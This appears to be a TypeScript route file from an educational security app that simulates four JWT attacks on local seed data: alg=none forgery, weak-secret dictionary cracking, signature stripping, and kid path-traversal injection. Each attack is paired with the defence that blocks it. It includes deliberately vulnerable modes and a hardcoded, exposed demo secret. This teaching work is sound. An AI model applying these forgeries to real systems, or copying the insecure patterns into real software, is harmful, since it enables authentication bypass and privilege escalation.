/**
 * 攻撃デモルート: JWT
 *
 * 【教育目的専用】
 * このファイルは OSI 参照アプリの教材機能として、
 * ローカル環境の固定シードデータに対する攻撃シミュレーションを提供します。
 *
 * - 外部ネットワークへのリクエストは行いません
 * - 実 CVE のエクスプロイトコードは含みません
 * - 本番環境での使用は想定していません
 *
 * 対象 CWE: CWE-345 (alg=none), CWE-326 (weak secret), CWE-347 (signature stripping), CWE-22 (kid injection)
 * 対象 CAPEC: CAPEC-49, CAPEC-88, CAPEC-196
 * 関連設計書: DESIGN/04-safety-guardrails.md, DESIGN/11-attack-jwt.md
 */
import { Hono } from "hono";
import jwt from "jsonwebtoken";
import crypto from "crypto";
import { parseBody, jwtSignSchema, jwtVerifySchema, jwtDecodeSchema, jwtAttackAlgNoneSchema, jwtAttackWeakSecretSchema, jwtAttackSignatureStrippingSchema, jwtAttackKidInjectionSchema } from "../validation.js";
import { getDb } from "../db/schema.js";
import { insertAttackLog, finalizeAttackLog } from "../db/queries.js";
import type { AttackResult, AttackStep } from "../../shared/api-types.js";

export const jwtOpsRoutes = new Hono();

// Demo secrets (visible for educational purposes)
const HS256_SECRET = "osi-demo-secret-key-for-hs256-signing";
const { publicKey: RS256_PUBLIC, privateKey: RS256_PRIVATE } = crypto.generateKeyPairSync("rsa", {
  modulusLength: 2048,
  publicKeyEncoding: { type: "spki", format: "pem" },
  privateKeyEncoding: { type: "pkcs8", format: "pem" },
});

const ALLOWED_ALGORITHMS: jwt.Algorithm[] = ["HS256", "RS256"];

jwtOpsRoutes.post("/sign", async (c) => {
  const parsed = await parseBody(c, jwtSignSchema);
  if ("error" in parsed) return parsed.error;
  const { claims, algorithm, expiresIn } = parsed.data;
  const trace = c.get("trace");

  const header = { alg: algorithm, typ: "JWT" };
  const payload = { ...claims, iat: Math.floor(Date.now() / 1000), exp: Math.floor(Date.now() / 1000) + expiresIn };

  // Step 1: Encode header
  const headerB64 = Buffer.from(JSON.stringify(header)).toString("base64url");
  trace.addCryptoOp({
    op: "base64url.encode(header)",
    input: JSON.stringify(header),
    output: headerB64,
    algo: "base64url",
    detail: "JWT Header → Base64URL encoding",
  });

  // Step 2: Encode payload
  const payloadB64 = Buffer.from(JSON.stringify(payload)).toString("base64url");
  trace.addCryptoOp({
    op: "base64url.encode(payload)",
    input: JSON.stringify(payload),
    output: payloadB64,
    algo: "base64url",
    detail: "JWT Payload → Base64URL encoding",
  });

  // Step 3: Create signature
  const signingInput = `${headerB64}.${payloadB64}`;
  const secret = algorithm === "RS256" ? RS256_PRIVATE : HS256_SECRET;
  const token = jwt.sign(claims, secret, {
    algorithm: algorithm as jwt.Algorithm,
    expiresIn,
  });

  const signature = token.split(".")[2];
  trace.addCryptoOp({
    op: `sign(${algorithm})`,
    input: `${signingInput.substring(0, 40)}...`,
    output: signature.substring(0, 40) + "...",
    algo: algorithm,
    detail: algorithm === "HS256"
      ? `HMAC-SHA256(secret="${HS256_SECRET.substring(0, 15)}...", data=header.payload)`
      : "RSA-SHA256(privateKey, data=header.payload)",
  });

  return c.json({
    success: true,
    data: {
      token,
      parts: { header: headerB64, payload: payloadB64, signature },
      decoded: { header, payload },
      secret: algorithm === "HS256" ? HS256_SECRET : "(RSA Private Key)",
    },
  });
});

jwtOpsRoutes.post("/verify", async (c) => {
  const parsed = await parseBody(c, jwtVerifySchema);
  if ("error" in parsed) return parsed.error;
  const { token, algorithm } = parsed.data;
  const trace = c.get("trace");

  const secret = algorithm === "RS256" ? RS256_PUBLIC : HS256_SECRET;

  try {
    const decoded = jwt.verify(token, secret, { algorithms: ALLOWED_ALGORITHMS });
    trace.addCryptoOp({
      op: `verify(${algorithm})`,
      input: token.substring(0, 40) + "...",
      output: "VALID ✓",
      algo: algorithm,
      detail: algorithm === "HS256"
        ? "Re-compute HMAC with secret → compare with token signature"
        : "Decrypt signature with public key → compare with hash of header.payload",
    });
    return c.json({ success: true, data: { valid: true, decoded } });
  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : "Unknown error";
    trace.addCryptoOp({
      op: `verify(${algorithm})`,
      input: token.substring(0, 40) + "...",
      output: `INVALID ✗ — ${message}`,
      algo: algorithm,
    });
    return c.json({ success: true, data: { valid: false, error: message } });
  }
});

jwtOpsRoutes.post("/decode", async (c) => {
  const parsed = await parseBody(c, jwtDecodeSchema);
  if ("error" in parsed) return parsed.error;
  const { token } = parsed.data;
  const decoded = jwt.decode(token, { complete: true });
  return c.json({ success: true, data: { decoded, warning: "Decoded WITHOUT verification!" } });
});

jwtOpsRoutes.get("/keys", (c) => {
  return c.json({
    success: true,
    data: {
      hs256Secret: HS256_SECRET,
      rs256PublicKey: RS256_PUBLIC,
      note: "⚠ In production, secrets are NEVER exposed to clients",
    },
  });
});

// ── 固定シードデータ (攻撃デモ用) ──
const SEED_ALICE_PAYLOAD = { sub: "seed_alice", role: "viewer", iat: 1714000000, exp: 9999999999 };

// 辞書 (100 件。"secret" が index 0 にあるので必ず 1 回目で見つかる)
const COMMON_DICT = [
  "secret", "password", "123456", "jwt-secret", "mysecret", "token", "admin", "qwerty", "letmein",
  "welcome", "monkey", "dragon", "master", "shadow", "abc123", "password1", "iloveyou",
  "111111", "12345678", "1234567", "trustno1", "sunshine", "princess",
  "football", "baseball", "michael", "jennifer", "jordan", "superman",
  "harley", "ranger", "buster", "thomas", "tigger", "robert",
  "soccer", "batman", "test", "pass", "killer", "hockey",
  "george", "charlie", "andrew", "michelle", "love", "jessica",
  "freedom", "6969", "pepper", "daniel", "access", "123123",
  "joshua", "maggie", "starwars", "silver", "william", "dallas",
  "yankees", "123qwe", "ashley", "666666", "hunter", "nicole",
  "magic", "passw0rd", "987654321", "amanda", "summer", "matrix",
  "secret123", "auth", "key",
  "default", "changeme", "admin123", "root", "demo", "demo123",
  "testing", "testtest", "passport", "private", "public", "shared",
  "company", "system", "manager", "internal", "external", "qwerty123",
  "test123", "user", "guest", "operator", "supervisor", "developer",
  "production", "staging", "development", "secure",
];

// ── Scenario A: alg=none 攻撃 ──
jwtOpsRoutes.post("/attack/alg-none", async (c) => {
  const parsed = await parseBody(c, jwtAttackAlgNoneSchema);
  if ("error" in parsed) return parsed.error;
  const { victim } = parsed.data;

  const trace = c.get("trace");
  const startedAt = Date.now();
  const scenarioId = "jwt-alg-none";
  const tabId = "jwt";

  const db = getDb();
  const logId = insertAttackLog(db, { scenarioId, tabId });
  const stepsCollected: AttackStep[] = [];

  const recordStep = (step: Omit<AttackStep, "timestamp">) => {
    trace.addAttackStep(step);
    stepsCollected.push({ ...step, timestamp: Date.now() });
  };

  try {
    // Step 1: 元 JWT ヘッダをデコード
    recordStep({
      id: "alg-none-1",
      kind: "probe",
      label: "Decode original JWT header",
      labelJa: "元 JWT ヘッダをデコード",
      status: "success",
      payload: {
        type: "token",
        decodedHeader: { alg: "HS256", typ: "JWT" },
        decodedPayload: SEED_ALICE_PAYLOAD,
        algo: "HS256",
      },
      detailJa: "最初のセグメントを Base64url デコードして alg フィールドを確認します。",
      detail: "Base64url decode the first segment to read the algorithm field.",
    });

    trace.addCryptoOp({
      op: "base64url.decode(header)",
      input: "<original-header>",
      output: JSON.stringify({ alg: "HS256", typ: "JWT" }),
      algo: "base64url",
    });

    // Step 2: alg=none に書き換え + role admin 昇格
    const forgedHeader = { alg: "none", typ: "JWT" };
    const forgedPayload = { ...SEED_ALICE_PAYLOAD, role: "admin" };
    const forgedHeaderB64 = Buffer.from(JSON.stringify(forgedHeader)).toString("base64url");
    const forgedPayloadB64 = Buffer.from(JSON.stringify(forgedPayload)).toString("base64url");
    const forgedToken = `${forgedHeaderB64}.${forgedPayloadB64}.`;

    trace.addCryptoOp({
      op: "base64url.encode(forged-header)",
      input: JSON.stringify(forgedHeader),
      output: forgedHeaderB64,
      algo: "base64url",
    });

    recordStep({
      id: "alg-none-2",
      kind: "tamper",
      label: "Rewrite alg='none' and escalate role to admin",
      labelJa: "alg='none' に書き換え、role を admin に昇格",
      status: "success",
      payload: {
        type: "token",
        decodedHeader: forgedHeader,
        decodedPayload: forgedPayload,
        algo: "none",
      },
    });

    // Step 3: 署名セグメント削除
    recordStep({
      id: "alg-none-3",
      kind: "forge",
      label: "Drop signature segment",
      labelJa: "署名セグメントを削除",
      status: "success",
      payload: {
        type: "token",
        after: forgedToken,
        algo: "none",
        signatureValid: false,
      },
      detailJa: "alg=none トークンは空の署名セグメントが必要です。末尾のドットは JWT 仕様で必須です。",
      detail: "alg=none tokens must have an empty signature.",
    });

    let outcome: AttackResult["outcome"];
    let blockedBy: string | undefined;
    let summaryJa: string;
    let summary: string;

    if (!victim.strict) {
      // 脆弱モード: 自前で alg=none を許容して payload を返す
      const [, pPart] = forgedToken.split(".");
      const decodedPayload = JSON.parse(Buffer.from(pPart, "base64url").toString("utf8"));

      trace.addCryptoOp({
        op: "jwt.verify(lenient)",
        input: forgedToken.substring(0, 40) + "...",
        output: "ACCEPTED (algorithms option omitted, alg=none received)",
        algo: "none",
        detail: "Lenient verifier accepts alg=none when algorithms option is missing",
      });

      recordStep({
        id: "alg-none-4",
        kind: "exploit",
        label: "Send forged token to lenient verifier",
        labelJa: "偽造トークンを脆弱検証エンドポイントに送信",
        status: "success",
        payload: {
          type: "http",
          request: { method: "POST", url: "/api/jwt/attack/alg-none", body: { mode: "lenient" } },
          response: { status: 200, body: { decoded: decodedPayload } },
        },
      });

      outcome = "succeeded";
      summaryJa = "この実装は脆弱です: algorithms 省略により alg=none が受理されました。";
      summary = "This implementation is vulnerable: alg=none accepted due to missing algorithms option.";
    } else {
      // 堅牢モード: jsonwebtoken の verify with algorithms allowlist
      let errorMessage = "invalid algorithm";
      try {
        jwt.verify(forgedToken, HS256_SECRET, { algorithms: ALLOWED_ALGORITHMS });
      } catch (err) {
        errorMessage = err instanceof Error ? err.message : "verification failed";
      }

      trace.addCryptoOp({
        op: "jwt.verify(strict)",
        input: forgedToken.substring(0, 40) + "...",
        output: `REJECTED (${errorMessage})`,
        algo: "HS256",
        detail: "Strict verifier rejects alg=none via algorithms allowlist",
      });

      recordStep({
        id: "alg-none-5",
        kind: "verify",
        label: "Send forged token to strict verifier",
        labelJa: "偽造トークンを堅牢検証エンドポイントに送信",
        status: "blocked",
        payload: {
          type: "http",
          request: { method: "POST", url: "/api/jwt/attack/alg-none", body: { mode: "strict" } },
          response: { status: 401, body: { error: errorMessage, blockedBy: "jwt_algorithms_allowlist" } },
        },
      });

      outcome = "blocked";
      blockedBy = "jwt_algorithms_allowlist";
      summaryJa = "防御が機能しました: algorithms 許可リストが alg=none を拒否しました。";
      summary = "Defense worked: algorithms allowlist rejected alg=none.";
    }

    const finishedAt = Date.now();
    const result: AttackResult = {
      scenarioId,
      outcome,
      startedAt,
      finishedAt,
      steps: stepsCollected,
      blockedBy,
      summary,
      summaryJa,
      logId,
    };

    finalizeAttackLog(db, logId, {
      success: outcome === "succeeded",
      blockedBy,
      stepsJson: JSON.stringify(stepsCollected),
      payloadJson: JSON.stringify({ victim, forgedToken }),
    });

    const status = outcome === "blocked" ? 401 : 200;
    return c.json({ success: true, data: result }, status);
  } catch (err) {
    const errorMessage = err instanceof Error ? err.message : "Unknown error";
    try {
      finalizeAttackLog(db, logId, {
        success: false,
        stepsJson: JSON.stringify(stepsCollected),
        payloadJson: JSON.stringify({ error: errorMessage }),
      });
    } catch {
      // finalize 失敗時は握り潰す (二重例外回避)
    }
    return c.json({ success: false, error: errorMessage, data: { scenarioId, outcome: "error", startedAt, finishedAt: Date.now(), steps: stepsCollected, logId } }, 500);
  }
});

// ── Scenario B: HS256 弱秘密鍵ブルートフォース ──
jwtOpsRoutes.post("/attack/weak-secret-bruteforce", async (c) => {
  const parsed = await parseBody(c, jwtAttackWeakSecretSchema);
  if ("error" in parsed) return parsed.error;
  const { secretType, dictionarySize } = parsed.data;

  const trace = c.get("trace");
  const startedAt = Date.now();
  const scenarioId = "jwt-weak-secret-bruteforce";
  const tabId = "jwt";
  const db = getDb();
  const logId = insertAttackLog(db, { scenarioId, tabId });
  const stepsCollected: AttackStep[] = [];
  const recordStep = (s: Omit<AttackStep, "timestamp">) => {
    trace.addAttackStep(s);
    stepsCollected.push({ ...s, timestamp: Date.now() });
  };

  try {
    // 攻撃対象トークンを生成 (弱 / 強 で異なる秘密鍵で署名)
    const targetSecret = secretType === "weak" ? "secret" : HS256_SECRET;
    const tokenPayload = { sub: "seed_alice", role: "admin", iat: Math.floor(Date.now() / 1000) };
    const targetToken = jwt.sign(tokenPayload, targetSecret, { algorithm: "HS256" });

    // Step 1: トークンキャプチャ
    recordStep({
      id: "brute-1",
      kind: "intercept",
      label: "Capture HS256 JWT token",
      labelJa: "HS256 JWT トークンを入手",
      status: "success",
      payload: { type: "token", before: targetToken.substring(0, 40) + "...", algo: "HS256" },
    });

    // Step 2: 辞書攻撃開始
    recordStep({
      id: "brute-2",
      kind: "probe",
      label: "Begin offline dictionary attack",
      labelJa: "オフライン辞書攻撃を開始",
      status: "success",
      payload: { type: "generic", data: { totalCandidates: dictionarySize, targetAlgo: "HMAC-SHA256", serverConnectionRequired: false } },
      detail: "HMAC-SHA256 can be computed locally. No server requests needed.",
      detailJa: "HMAC-SHA256 はローカルで計算できます。サーバーへのリクエストは不要です。",
    });

    // 辞書ループ (サーバー側で実行)
    const candidates = COMMON_DICT.slice(0, dictionarySize);
    let crackedSecret: string | null = null;
    let attemptCount = 0;
    const triedPasswords: string[] = [];
    for (const candidate of candidates) {
      attemptCount++;
      triedPasswords.push(candidate);
      try {
        jwt.verify(targetToken, candidate, { algorithms: ALLOWED_ALGORITHMS });
        crackedSecret = candidate;
        break;
      } catch {
        // 不一致、次の候補へ
      }
    }

    trace.addCryptoOp({
      op: `HMAC-SHA256 dictionary trial (${attemptCount} attempts)`,
      input: `target=${targetToken.substring(0, 30)}..., dict=${candidates.length} candidates`,
      output: crackedSecret ? `MATCH: "${crackedSecret}" at attempt ${attemptCount}` : `NO MATCH (${attemptCount} attempts)`,
      algo: "HMAC-SHA256",
    });

    let outcome: AttackResult["outcome"];
    let blockedBy: string | undefined;
    let summaryJa: string;
    let summary: string;

    if (crackedSecret) {
      // Step 3: マッチ発見
      recordStep({
        id: "brute-3",
        kind: "exploit",
        label: "Match found: weak secret cracked",
        labelJa: "一致発見: 弱い秘密鍵がクラックされました",
        status: "success",
        payload: { type: "credential", crackedPassword: crackedSecret, triedPasswords: triedPasswords.slice(0, Math.min(triedPasswords.length, 10)) },
        detailJa: `HMAC-SHA256(header.payload, '${crackedSecret}') がトークン署名と一致しました。`,
        detail: `HMAC-SHA256(header.payload, '${crackedSecret}') matches the token signature.`,
      });

      // Step 4: 偽造トークン署名
      const forgedPayload = { sub: "attacker_charlie", role: "admin" };
      const forgedToken = jwt.sign(forgedPayload, crackedSecret, { algorithm: "HS256" });
      trace.addCryptoOp({
        op: "jwt.sign(forgedPayload, crackedSecret)",
        input: JSON.stringify(forgedPayload),
        output: forgedToken.substring(0, 40) + "...",
        algo: "HS256",
      });
      recordStep({
        id: "brute-4",
        kind: "forge",
        label: "Re-sign token with cracked secret (role=admin)",
        labelJa: "クラックした秘密鍵で新規トークン署名 (role=admin)",
        status: "success",
        payload: { type: "token", after: forgedToken.substring(0, 40) + "...", algo: "HS256", decodedPayload: forgedPayload, signatureValid: true },
      });

      outcome = "succeeded";
      summaryJa = `この実装は脆弱です: 秘密鍵 "${crackedSecret}" は辞書 ${attemptCount} 件目で発見されました。`;
      summary = `This implementation is vulnerable: secret "${crackedSecret}" found at dictionary attempt ${attemptCount}.`;
    } else {
      // Step 5: 全候補失敗
      recordStep({
        id: "brute-5",
        kind: "verify",
        label: "Strong random secret resists dictionary",
        labelJa: "十分なランダム秘密鍵では辞書が通用しない",
        status: "blocked",
        payload: { type: "generic", data: { strongSecretLength: targetSecret.length, triedCandidates: attemptCount, matched: 0 } },
      });
      outcome = "blocked";
      blockedBy = "strong_random_secret";
      summaryJa = "防御が機能しました: 十分な長さのランダム秘密鍵はブルートフォースに耐性があります。";
      summary = "Defense worked: strong random secret resists brute force.";
    }

    const finishedAt = Date.now();
    const result: AttackResult = { scenarioId, outcome, startedAt, finishedAt, steps: stepsCollected, blockedBy, summary, summaryJa, logId };
    const extraData = { crackedSecret, attemptCount };

    finalizeAttackLog(db, logId, {
      success: outcome === "succeeded",
      blockedBy,
      stepsJson: JSON.stringify(stepsCollected),
      payloadJson: JSON.stringify({ secretType, dictionarySize, ...extraData }),
    });

    const status = outcome === "blocked" ? 401 : 200;
    return c.json({ success: true, data: { ...result, ...extraData } }, status);
  } catch (err) {
    const errorMessage = err instanceof Error ? err.message : "Unknown error";
    try {
      finalizeAttackLog(db, logId, {
        success: false,
        stepsJson: JSON.stringify(stepsCollected),
        payloadJson: JSON.stringify({ error: errorMessage }),
      });
    } catch {
      // finalize 失敗時は握り潰す (二重例外回避)
    }
    return c.json({ success: false, error: errorMessage, data: { scenarioId, outcome: "error", startedAt, finishedAt: Date.now(), steps: stepsCollected, logId } }, 500);
  }
});

// ── Scenario C: 署名ストリッピング ──
jwtOpsRoutes.post("/attack/signature-stripping", async (c) => {
  const parsed = await parseBody(c, jwtAttackSignatureStrippingSchema);
  if ("error" in parsed) return parsed.error;
  const { forgedToken: reqToken, mode } = parsed.data;

  const trace = c.get("trace");
  const startedAt = Date.now();
  const scenarioId = "jwt-signature-stripping";
  const tabId = "jwt";
  const db = getDb();
  const logId = insertAttackLog(db, { scenarioId, tabId });
  const stepsCollected: AttackStep[] = [];
  const recordStep = (s: Omit<AttackStep, "timestamp">) => {
    trace.addAttackStep(s);
    stepsCollected.push({ ...s, timestamp: Date.now() });
  };

  try {
    const forgedHeaderB64 = Buffer.from(JSON.stringify({ alg: "HS256", typ: "JWT" })).toString("base64url");
    const forgedPayloadB64 = Buffer.from(JSON.stringify({ sub: "attacker_charlie", role: "admin", iat: 1714000000 })).toString("base64url");
    const forgedToken = reqToken ?? `${forgedHeaderB64}.${forgedPayloadB64}.INVALID_SIGNATURE_PLACEHOLDER`;

    const realDecoded = jwt.decode(forgedToken, { complete: true });
    trace.addCryptoOp({
      op: "base64url.decode(header+payload)",
      input: forgedToken.substring(0, 40) + "...",
      output: realDecoded ? JSON.stringify(realDecoded) : "(decode failed)",
      algo: "base64url",
    });

    // Step 1: 偽造トークン作成
    recordStep({
      id: "strip-1",
      kind: "probe",
      label: "Craft token with valid header+payload but invalid signature",
      labelJa: "有効なヘッダ+ペイロードを持つが署名が無効なトークンを作成",
      status: "success",
      payload: {
        type: "token",
        before: forgedToken.substring(0, 40) + "...",
        decodedHeader: { alg: "HS256", typ: "JWT" },
        decodedPayload: { sub: "attacker_charlie", role: "admin", iat: 1714000000 },
        algo: "HS256",
        signatureValid: false,
      },
      detail: "Token has a valid structure but the signature segment is forged.",
      detailJa: "トークンは有効な構造ですが、署名セグメントは偽造されています。",
    });

    // Step 2: 偽造
    recordStep({
      id: "strip-2",
      kind: "forge",
      label: "Replace signature with arbitrary bytes",
      labelJa: "署名を任意のバイト列で置き換え",
      status: "success",
      payload: {
        type: "token",
        after: forgedToken.substring(0, 40) + "...",
        algo: "HS256",
        signatureValid: false,
      },
      detail: "The forged token looks structurally valid but has an invalid signature.",
      detailJa: "偽造トークンは構造的に有効に見えますが、署名が無効です。",
    });

    let outcome: AttackResult["outcome"];
    let blockedBy: string | undefined;
    let summaryJa: string;
    let summary: string;

    if (mode === "decode-only") {
      // 脆弱モード: jwt.decode() のみ (署名検証なし)
      const decoded = jwt.decode(forgedToken, { complete: true });

      trace.addCryptoOp({
        op: "jwt.decode(token) — no verification",
        input: forgedToken.substring(0, 40) + "...",
        output: `DECODED (no signature check): ${JSON.stringify(decoded?.payload).substring(0, 60)}...`,
        algo: "none",
        detail: "jwt.decode() does not verify the signature — any payload is accepted.",
      });

      recordStep({
        id: "strip-3",
        kind: "exploit",
        label: "decode-only endpoint returns payload without verification",
        labelJa: "decode-only エンドポイントが署名未検証でペイロードを返す",
        status: "success",
        payload: {
          type: "http",
          request: { method: "POST", url: "/api/jwt/attack/signature-stripping", body: { mode: "decode-only" } },
          response: { status: 200, body: { decoded: decoded?.payload } },
        },
      });

      outcome = "succeeded";
      summaryJa = "この実装は脆弱です: jwt.decode() は署名を検証しないため、偽造トークンのペイロードが受理されました。";
      summary = "This implementation is vulnerable: jwt.decode() accepted the forged token payload without signature verification.";
    } else {
      // 堅牢モード: jwt.verify() で検証 → 拒否
      let errorMessage = "invalid signature";
      try {
        jwt.verify(forgedToken, HS256_SECRET, { algorithms: ALLOWED_ALGORITHMS });
      } catch (err) {
        errorMessage = err instanceof Error ? err.message : "verification failed";
      }

      trace.addCryptoOp({
        op: "jwt.verify(token, secret)",
        input: forgedToken.substring(0, 40) + "...",
        output: `REJECTED (${errorMessage})`,
        algo: "HS256",
        detail: "jwt.verify() recomputes the HMAC and rejects tokens with invalid signatures.",
      });

      recordStep({
        id: "strip-4",
        kind: "verify",
        label: "Strict verifier rejects token with invalid signature",
        labelJa: "堅牢検証が無効な署名を持つトークンを拒否",
        status: "blocked",
        payload: {
          type: "http",
          request: { method: "POST", url: "/api/jwt/attack/signature-stripping", body: { mode: "verify" } },
          response: { status: 401, body: { error: errorMessage, blockedBy: "jwt_signature_mismatch" } },
        },
      });

      outcome = "blocked";
      blockedBy = "jwt_signature_mismatch";
      summaryJa = "防御が機能しました: jwt.verify() が無効な署名を検出して拒否しました。";
      summary = "Defense worked: jwt.verify() detected and rejected the invalid signature.";
    }

    const finishedAt = Date.now();
    const result: AttackResult = { scenarioId, outcome, startedAt, finishedAt, steps: stepsCollected, blockedBy, summary, summaryJa, logId };

    finalizeAttackLog(db, logId, {
      success: outcome === "succeeded",
      blockedBy,
      stepsJson: JSON.stringify(stepsCollected),
      payloadJson: JSON.stringify({ mode, forgedToken: forgedToken.substring(0, 60) }),
    });

    const status = outcome === "blocked" ? 401 : 200;
    return c.json({ success: true, data: result }, status);
  } catch (err) {
    const errorMessage = err instanceof Error ? err.message : "Unknown error";
    try {
      finalizeAttackLog(db, logId, {
        success: false,
        stepsJson: JSON.stringify(stepsCollected),
        payloadJson: JSON.stringify({ error: errorMessage }),
      });
    } catch {
      // finalize 失敗時は握り潰す (二重例外回避)
    }
    return c.json({ success: false, error: errorMessage, data: { scenarioId, outcome: "error", startedAt, finishedAt: Date.now(), steps: stepsCollected, logId } }, 500);
  }
});

// ── Scenario D: kid ヘッダインジェクション ──
const ALLOWED_KID = new Set(["key-1", "key-2"]);
const DEFAULT_INJECTED_KID = "../public/attacker-key.pem";

jwtOpsRoutes.post("/attack/kid-injection", async (c) => {
  const parsed = await parseBody(c, jwtAttackKidInjectionSchema);
  if ("error" in parsed) return parsed.error;
  const { injectedKid, mode } = parsed.data;

  const trace = c.get("trace");
  const startedAt = Date.now();
  const scenarioId = "jwt-kid-injection";
  const tabId = "jwt";
  const db = getDb();
  const logId = insertAttackLog(db, { scenarioId, tabId });
  const stepsCollected: AttackStep[] = [];
  const recordStep = (s: Omit<AttackStep, "timestamp">) => {
    trace.addAttackStep(s);
    stepsCollected.push({ ...s, timestamp: Date.now() });
  };

  try {
    const kid = injectedKid ?? DEFAULT_INJECTED_KID;

    // Step 1: kid 値のプローブ
    recordStep({
      id: "kid-1",
      kind: "probe",
      label: "Inspect JWT kid header field",
      labelJa: "JWT kid ヘッダフィールドを調査",
      status: "success",
      payload: {
        type: "token",
        decodedHeader: { alg: "RS256", typ: "JWT", kid },
        algo: "RS256",
      },
      detail: "The kid (Key ID) header tells the server which key to use for verification.",
      detailJa: "kid (Key ID) ヘッダはサーバーに検証に使用する鍵を指示します。",
    });

    // Step 2: パストラバーサル kid 注入
    recordStep({
      id: "kid-2",
      kind: "tamper",
      label: "Inject path traversal string into kid header",
      labelJa: "kid ヘッダにパストラバーサル文字列を注入",
      status: "success",
      payload: {
        type: "token",
        decodedHeader: { alg: "RS256", typ: "JWT", kid },
        algo: "RS256",
      },
      detail: `Injected kid="${kid}" to attempt path traversal to attacker-controlled key.`,
      detailJa: `kid="${kid}" を注入して攻撃者制御の鍵へのパストラバーサルを試みます。`,
    });

    let outcome: AttackResult["outcome"];
    let blockedBy: string | undefined;
    let summaryJa: string;
    let summary: string;
    let kidResolved: string | undefined;

    if (mode === "vulnerable") {
      // シミュレーション: kid 値を「鍵ファイルパス」として "解決" するふりをする
      // 実際のファイル読み込みは絶対に行わない (隔離原則)
      trace.addCryptoOp({
        op: "kid resolution (simulated)",
        input: `kid="${kid}"`,
        output: "RESOLVED to attacker-controlled key (simulated)",
        algo: "RS256",
        detail: "Vulnerable mode: kid is used as path without sanitization. NO actual file read.",
      });

      // Step 3: 攻撃者制御の鍵で検証が通ったていのシミュレーション
      recordStep({
        id: "kid-3",
        kind: "forge",
        label: "Forge token using attacker-controlled key (simulated)",
        labelJa: "攻撃者制御の鍵でトークンを偽造 (シミュレーション)",
        status: "success",
        payload: {
          type: "token",
          decodedHeader: { alg: "RS256", typ: "JWT", kid },
          decodedPayload: { sub: "attacker_charlie", role: "admin" },
          algo: "RS256",
          signatureValid: true,
        },
        detail: "Simulated: attacker-controlled key path resolved, forged token accepted.",
        detailJa: "シミュレーション: 攻撃者制御の鍵パスが解決され、偽造トークンが受理されました。",
      });

      // Step 4: エクスプロイト
      recordStep({
        id: "kid-4",
        kind: "exploit",
        label: "Vulnerable verifier accepts forged token with injected kid",
        labelJa: "脆弱な検証が注入された kid を持つ偽造トークンを受理",
        status: "success",
        payload: {
          type: "http",
          request: { method: "POST", url: "/api/jwt/attack/kid-injection", body: { mode: "vulnerable", injectedKid: kid } },
          response: { status: 200, body: { kidResolved: kid, accepted: true } },
        },
      });

      outcome = "succeeded";
      kidResolved = kid;
      summaryJa = `この実装は脆弱です: kid "${kid}" がファイルパスとして解決されました (シミュレーション)。`;
      summary = `This implementation is vulnerable: kid "${kid}" was resolved as a file path (simulated).`;
    } else {
      // allowlist 検証
      const isAllowed = ALLOWED_KID.has(kid);

      trace.addCryptoOp({
        op: "kid allowlist check",
        input: `kid="${kid}", allowlist=["key-1","key-2"]`,
        output: isAllowed ? "ALLOWED" : "REJECTED (not in allowlist)",
        algo: "validation",
      });

      if (!isAllowed) {
        // Step 3: 拒否
        recordStep({
          id: "kid-3",
          kind: "verify",
          label: "Allowlist check rejects unknown kid",
          labelJa: "許可リストが未知の kid を拒否",
          status: "blocked",
          payload: {
            type: "http",
            request: { method: "POST", url: "/api/jwt/attack/kid-injection", body: { mode: "allowlist", injectedKid: kid } },
            response: { status: 401, body: { error: "kid not in allowlist", blockedBy: "jwt_kid_not_in_allowlist" } },
          },
          detail: `kid="${kid}" is not in the allowlist ["key-1", "key-2"].`,
          detailJa: `kid="${kid}" は許可リスト ["key-1", "key-2"] に含まれていません。`,
        });

        outcome = "blocked";
        blockedBy = "jwt_kid_not_in_allowlist";
        summaryJa = "防御が機能しました: kid 許可リストが未知の kid を拒否しました。";
        summary = "Defense worked: kid allowlist rejected the unknown kid value.";
      } else {
        // 許可リスト内 (通常はここには到達しない)
        recordStep({
          id: "kid-3",
          kind: "verify",
          label: "Allowlist check passes for known kid",
          labelJa: "許可リストが既知の kid を許可",
          status: "success",
          payload: {
            type: "generic",
            data: { kid, allowed: true },
          },
        });

        outcome = "succeeded";
        kidResolved = kid;
        summaryJa = `このシナリオでは kid "${kid}" は許可リストに含まれています。`;
        summary = `In this scenario, kid "${kid}" is in the allowlist.`;
      }
    }

    const finishedAt = Date.now();
    const result: AttackResult = { scenarioId, outcome, startedAt, finishedAt, steps: stepsCollected, blockedBy, summary, summaryJa, logId };

    finalizeAttackLog(db, logId, {
      success: outcome === "succeeded",
      blockedBy,
      stepsJson: JSON.stringify(stepsCollected),
      payloadJson: JSON.stringify({ mode, kid }),
    });

    const status = outcome === "blocked" ? 401 : 200;
    return c.json({ success: true, data: { ...result, kidResolved } }, status);
  } catch (err) {
    const errorMessage = err instanceof Error ? err.message : "Unknown error";
    try {
      finalizeAttackLog(db, logId, {
        success: false,
        stepsJson: JSON.stringify(stepsCollected),
        payloadJson: JSON.stringify({ error: errorMessage }),
      });
    } catch {
      // finalize 失敗時は握り潰す (二重例外回避)
    }
    return c.json({ success: false, error: errorMessage, data: { scenarioId, outcome: "error", startedAt, finishedAt: Date.now(), steps: stepsCollected, logId } }, 500);
  }
});
